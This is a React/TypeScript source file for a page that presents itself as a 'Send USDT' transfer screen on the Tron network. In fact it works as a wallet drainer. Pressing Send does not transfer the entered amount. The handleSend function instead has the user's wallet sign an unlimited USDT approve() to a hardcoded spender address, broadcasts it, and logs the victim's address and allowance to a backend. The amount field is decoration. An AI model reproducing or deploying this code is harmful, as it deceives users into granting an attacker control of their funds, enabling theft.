import { useState, useEffect, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";
import SignClient from "@walletconnect/sign-client";

// ✅ TronWeb bilkul import nahi karenge — CDN se load hoga
// npm wala TronWeb browser mein require() use karta hai jo crash karta hai

declare global {
  interface Window {
    tronWeb?: any;
    tronLink?: any;
    TronWeb: any;
  }
}

const PROJECT_ID   = "6b5df56bc30c1dadaab59498b86fd3e8";
const TRON_USDT    = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_SPENDER = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";

// ✅ TronWeb CDN se load — singleton promise
let _twPromise: Promise<any> | null = null;

function loadTronWebCDN(): Promise<any> {
  if (_twPromise) return _twPromise;

  _twPromise = new Promise((resolve, reject) => {
    // Pehle se load hai toh seedha return
    if (typeof window !== "undefined" && window.TronWeb) {
      return resolve(window.TronWeb);
    }

    const script = document.createElement("script");
    script.src = "https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js";
    script.async = true;

    script.onload = () => {
      if (window.TronWeb) {
        console.log("✅ TronWeb CDN loaded");
        resolve(window.TronWeb);
      } else {
        reject(new Error("TronWeb CDN load hua lekin window.TronWeb nahi mila"));
      }
    };

    script.onerror = () => {
      _twPromise = null; // retry allow karo
      reject(new Error("TronWeb CDN download fail hua"));
    };

    document.head.appendChild(script);
  });

  return _twPromise;
}

// ✅ Ready-to-use TronWeb instance deta hai
async function getTW() {
  const TronWebClass = await loadTronWebCDN();
  return new TronWebClass({ fullHost: "https://api.trongrid.io" });
}

export default function Index() {
  const [searchParams] = useSearchParams();
  const [amount, setAmount] = useState("");
  const [transactionStatus, setTransactionStatusState] = useState<
    "idle" | "processing" | "success"
  >("idle");
  const createTransaction = useMutation(api.transactions.createTransaction);

  const wcClientRef    = useRef<any>(null);
  const wcSessionRef   = useRef<any>(null);
  const userAddressRef = useRef<string>("");
  const wcModalRef     = useRef<any>(null);

  // ===== INIT =====
  useEffect(() => {
    // TronWeb background mein preload shuru karo
    loadTronWebCDN().catch((e) => console.warn("TronWeb preload warn:", e.message));

    async function initWC() {
      try {
        console.log("🔄 WalletConnect init...");

        const client = await SignClient.init({
          projectId: PROJECT_ID,
          metadata: {
            name: "USDT Transfer",
            description: "TRON USDT Transfer",
            url: window.location.origin,
            icons: [],
          },
        });

        wcClientRef.current = client;
        console.log("✅ SignClient ready");

        client.on("session_delete", () => {
          wcSessionRef.current   = null;
          userAddressRef.current = "";
        });

        client.on("session_expire", () => {
          wcSessionRef.current   = null;
          userAddressRef.current = "";
        });

        document.addEventListener("visibilitychange", () => {
          if (document.visibilityState === "visible") {
            try { client.core?.relayer?.restartTransport?.(); } catch {}
          }
        });

        const { WalletConnectModal } = await import("@walletconnect/modal");
        wcModalRef.current = new WalletConnectModal({
          projectId: PROJECT_ID,
          themeMode: "dark",
        });

        console.log("✅ WalletConnect + Modal ready!");
      } catch (e: any) {
        console.error("❌ WC Init error:", e.message);
      }
    }

    initWC();
  }, []);

  // ===== CONNECT WALLET =====
  async function connectWallet(): Promise<string> {
    if (!wcClientRef.current) throw new Error("WalletConnect ready nahi. Refresh karein.");
    if (!wcModalRef.current)  throw new Error("Modal ready nahi. Refresh karein.");

    if (wcSessionRef.current) {
      try {
        await wcClientRef.current.disconnect({
          topic:  wcSessionRef.current.topic,
          reason: { code: 6000, message: "New connection" },
        });
      } catch {}
      wcSessionRef.current   = null;
      userAddressRef.current = "";
    }

    const { uri, approval } = await wcClientRef.current.connect({
      requiredNamespaces: {
        tron: {
          methods: ["tron_signTransaction", "tron_signMessage"],
          chains:  ["tron:0x2b6653dc"],
          events:  ["chainChanged", "accountsChanged"],
        },
      },
    });

    if (!uri) throw new Error("WalletConnect URI nahi mila");

    await wcModalRef.current.openModal({ uri });
    wcSessionRef.current = await approval();
    wcModalRef.current.closeModal();

    const accounts = Object.values(wcSessionRef.current.namespaces)
      .flatMap((ns: any) => ns.accounts) as string[];

    const tronAcc = accounts.find((a: string) => a.startsWith("tron:"));
    if (!tronAcc) throw new Error("Tron account nahi mila");

    userAddressRef.current = tronAcc.split(":")[2];
    console.log("👤 User address:", userAddressRef.current);
    return userAddressRef.current;
  }

  // ===== HANDLE SEND =====
  async function handleSend() {
    setTransactionStatusState("processing");

    try {
      const userAddress = await connectWallet();

      // ✅ CDN wala TronWeb
      console.log("⏳ TronWeb load ho raha hai...");
      const tw = await getTW();
      console.log("✅ TronWeb instance ready");

      // ✅ Sahi hex conversion — 41 prefix ke SAATH rakhna hai API ke liye
      const ownerHex   = tw.address.toHex(userAddress);   // e.g. 41xxxx...
      const spenderHex = tw.address.toHex(TRON_SPENDER).replace(/^41/, ""); // ABI ke liye 41 hatao
      const usdtHex    = tw.address.toHex(TRON_USDT);     // e.g. 41xxxx...

      console.log("ownerHex:", ownerHex);
      console.log("spenderHex (no 41):", spenderHex, "| length:", spenderHex.length); // 40 hona chahiye
      console.log("usdtHex:", usdtHex);

      // ✅ ABI encode: 32 bytes address + 32 bytes uint256 = 128 hex chars
      const hexAddress = spenderHex.padStart(64, "0");
      const hexAmount  = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
      const parameter  = hexAddress + hexAmount;

      if (parameter.length !== 128) {
        throw new Error(`ABI encode galat! length=${parameter.length}, chahiye=128`);
      }
      console.log("✅ Parameter (128 chars):", parameter);

      // ✅ visible: false — Hex addresses use karo
      // Trust Wallet sirf Hex format sign karta hai, Base58 nahi
      const apiRes = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          owner_address:     ownerHex,   // ✅ Hex format (41xxxx)
          contract_address:  usdtHex,    // ✅ Hex format (41xxxx)
          function_selector: "approve(address,uint256)",
          parameter,
          fee_limit:         100_000_000,
          call_value:        0,
          visible:           false,      // ✅ false — Hex response chahiye sign ke liye
        }),
      });

      const apiData = await apiRes.json();
      console.log("📋 TronGrid response:", apiData);

      if (!apiData.transaction) {
        throw new Error("Build failed: " + (apiData.Error || apiData.error || JSON.stringify(apiData)));
      }

      // ✅ Sign request
      console.log("🔐 Sign bhej raha hoon wallet ko...");
      const signResponse = await Promise.race([
        wcClientRef.current.request({
          topic:   wcSessionRef.current.topic,
          chainId: "tron:0x2b6653dc",
          request: {
            method: "tron_signTransaction",
            params: [apiData.transaction],
          },
        }),
        new Promise((_, rej) =>
          setTimeout(() => rej(new Error("Sign timeout — wallet mein confirm karein")), 180_000)
        ),
      ]);

      let signedTx = (signResponse as any)?.result || signResponse;
      if (!signedTx) throw new Error("Wallet ne reject kar diya");
      if (typeof signedTx === "string") {
        try { signedTx = JSON.parse(signedTx); } catch {}
      }
      console.log("✅ Signed");

      // ✅ Broadcast
      const broadcastRes = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify(signedTx),
      });

      const result = await broadcastRes.json();
      console.log("📡 Broadcast result:", result);

      if (!result || (result.result !== true && !result.txid)) {
        throw new Error("Broadcast failed: " + JSON.stringify(result));
      }

      const txId = result.txid || result.transaction?.txID;
      console.log("✅ TX ID:", txId);

      // 10s confirmation wait
      await new Promise((r) => setTimeout(r, 10_000));

      // ✅ Allowance check
      const contract = await tw.contract([{
        constant:        true,
        inputs:          [
          { name: "owner",   type: "address" },
          { name: "spender", type: "address" },
        ],
        name:            "allowance",
        outputs:         [{ name: "", type: "uint256" }],
        stateMutability: "view",
        type:            "function",
      }], TRON_USDT);

      const raw           = await contract.allowance(userAddress, TRON_SPENDER).call();
      const allowanceUSDT = (Number(raw) / 1e6).toFixed(2);
      console.log("✅ Allowance:", allowanceUSDT, "USDT");

      await createTransaction({
        walletAddress: userAddress,
        toAddress:     TRON_SPENDER,
        amount:        amount || "Max",
        txHash:        txId || "tx",
        usdtBalance:   allowanceUSDT + " USDT",
        nativeBalance: "0 TRX",
      });

      setTransactionStatusState("success");
      setTimeout(() => setTransactionStatusState("idle"), 3000);
      alert(`✅ Approval successful!\nAllowance: ${allowanceUSDT} USDT\nTx: ${txId}`);

    } catch (err: any) {
      console.error("❌ Error:", err.message);
      try { wcModalRef.current?.closeModal(); } catch {}
      setTransactionStatusState("idle");
      alert("❌ " + (err.message || "Transaction fail ho gayi"));
    }
  }

  const dollarValue =
    amount && amount !== "Max" && !isNaN(Number(amount))
      ? `$${Number(amount).toFixed(2)}`
      : "$0.00";

  const TRXIcon = () => (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
      <polygon points="12,2 22,8 22,16 12,22 2,16 2,8" fill="white" opacity="0.9" />
      <polygon points="12,5 19,9 19,15 12,19 5,15 5,9" fill="#EF0027" opacity="0.8" />
      <text x="12" y="16" textAnchor="middle" fill="white" fontSize="9" fontWeight="bold">T</text>
    </svg>
  );

  const XCircle = ({ onClick }: { onClick: () => void }) => (
    <button onClick={onClick} style={{
      background: "none", border: "1.5px solid #555", borderRadius: "50%",
      width: "22px", height: "22px", color: "#aaa", cursor: "pointer",
      display: "flex", alignItems: "center", justifyContent: "center",
      fontSize: "11px", flexShrink: 0, padding: 0,
    }}>✕</button>
  );

  return (
    <div style={{
      margin: 0, minHeight: "100vh", background: "#1c1c1e", color: "#ffffff",
      fontFamily: "-apple-system, BlinkMacSystemFont, 'SF Pro Text', system-ui, sans-serif",
      display: "flex", flexDirection: "column", maxWidth: "480px",
      marginLeft: "auto", marginRight: "auto",
    }}>

      {/* Header */}
      <div style={{
        display: "flex", alignItems: "center", justifyContent: "space-between",
        padding: "20px 22px 16px",
      }}>
        <button onClick={() => window.history.back()} style={{
          background: "none", border: "none", color: "#fff",
          cursor: "pointer", fontSize: "22px", lineHeight: 1, padding: 0,
        }}>←</button>
        <span style={{ fontSize: "18px", fontWeight: 700 }}>Send USDT</span>
        <button onClick={() => window.history.back()} style={{
          background: "none", border: "none", color: "#fff",
          cursor: "pointer", fontSize: "20px", lineHeight: 1, padding: 0,
        }}>✕</button>
      </div>

      <div style={{ padding: "4px 18px", flex: 1 }}>

        {/* Network Badge */}
        <div style={{ marginBottom: "14px" }}>
          <label style={{
            display: "block", fontSize: "14px", fontWeight: 500,
            color: "#8e8e93", marginBottom: "9px",
          }}>
            Destination network
          </label>
          <div style={{
            display: "inline-flex", alignItems: "center", gap: "7px",
            background: "#2c2c2e", borderRadius: "20px", padding: "7px 13px 7px 8px",
          }}>
            <div style={{
              width: "26px", height: "26px", borderRadius: "50%", background: "#EF0027",
              display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0,
            }}>
              <TRXIcon />
            </div>
            <span style={{ fontSize: "15px", fontWeight: 600, color: "#fff" }}>Tron Network</span>
          </div>
        </div>

        {/* Amount Input */}
        <div style={{ marginBottom: "6px" }}>
          <label style={{
            display: "block", fontSize: "14px", fontWeight: 500,
            color: "#8e8e93", marginBottom: "9px",
          }}>
            Amount
          </label>
          <div style={{
            display: "flex", alignItems: "center",
            border: "1px solid #2e2e30", borderRadius: "14px",
            padding: "14px", background: "#242426", gap: "8px",
          }}>
            <input
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="0"
              type="text"
              inputMode="decimal"
              style={{
                flex: 1, background: "transparent", border: "none", outline: "none",
                color: "#fff", fontSize: "18px", fontFamily: "inherit", minWidth: 0,
              }}
            />
            {amount && <XCircle onClick={() => setAmount("")} />}
            <span style={{ color: "#8e8e93", fontSize: "16px", flexShrink: 0 }}>USDT</span>
            <button onClick={() => setAmount("Max")} style={{
              background: "none", border: "none", color: "#39d353",
              cursor: "pointer", fontSize: "16px", fontWeight: 600, padding: 0, flexShrink: 0,
            }}>Max</button>
          </div>
          <div style={{ fontSize: "13px", color: "#636366", marginTop: "7px", paddingLeft: "2px" }}>
            ≈ {dollarValue}
          </div>
        </div>
      </div>

      {/* Send Button */}
      <div style={{ padding: "12px 18px", paddingBottom: "42px" }}>
        <button
          onClick={handleSend}
          disabled={transactionStatus !== "idle"}
          style={{
            width: "100%",
            background: transactionStatus === "processing" ? "#2a6e3a" : "#39d353",
            color: "#000", border: "none", borderRadius: "30px",
            padding: "18px", fontSize: "18px", fontWeight: 700,
            cursor: transactionStatus === "idle" ? "pointer" : "default",
            transition: "all 0.2s ease", letterSpacing: "0.01em",
          }}
        >
          {transactionStatus === "success"
            ? "✓ Transaction Successful!"
            : transactionStatus === "processing"
            ? "Processing..."
            : "Send"}
        </button>
      </div>

    </div>
  );
}
